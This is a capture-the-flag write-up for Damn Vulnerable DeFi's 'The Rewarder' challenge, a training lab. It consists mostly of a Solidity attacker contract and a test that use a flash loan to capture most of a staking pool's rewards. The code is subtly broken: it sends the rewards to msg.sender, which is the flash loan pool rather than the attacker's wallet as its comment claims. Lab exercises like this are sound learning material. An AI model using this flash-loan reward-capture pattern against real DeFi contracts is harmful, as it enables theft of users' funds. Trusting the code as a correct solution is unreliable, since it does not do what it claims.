# #5 The Rewarder Damn Vulnerable Defi

## Goals

=> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

=> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

=> You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

=> By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

### Hints

- None

### Solution

- Advance the evm time by 5 days so the new payout round takes place

- Create a contract that takes a Flashloan for the 1 million liquidity tokens
- When the contract receives the Flashloan we need to approve the rewarder pool for our tokens and send the tokens via deposit to the rewarder pool

- We get rewarded with rewardToken

- Then withdraw the deposited liquidity tokens to send them back to the flash loan pool

### Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    RewardToken public rewardToken;
    FlashLoanerPool public loanerPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public immutable liquidityToken;

    constructor(
        address _rewardToken,
        address _loanerPool,
        address _rewarderPool,
        address liquidityTokenAddress
    ) {
        rewardToken = RewardToken(_rewardToken);
        loanerPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        // take flashLoan for 1 mil Token
    }

    function attack() external {
        loanerPool.flashLoan(1_000_000 ether);
    }

    // gets called by FlashLoanPool contract
    function receiveFlashLoan(uint256 amount) external {
        uint256 balance = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(rewarderPool), balance);
        rewarderPool.deposit(balance);
        rewarderPool.withdraw(balance);
        // Return funds to pool
        liquidityToken.transfer(address(loanerPool), amount);
        // transfer rewards to attackerWallet
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
```

### Test

```javascript
it('Execution', async function () {
	await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
	const AttackerFactory = await ethers.getContractFactory('RewarderAttacker', deployer);
	const attacker = await AttackerFactory.deploy(
		rewardToken.address,
		flashLoanPool.address,
		rewarderPool.address,
		liquidityToken.address
	);
	const attackTx = await attacker.connect(player).attack();
	await attackTx.wait();
});
```
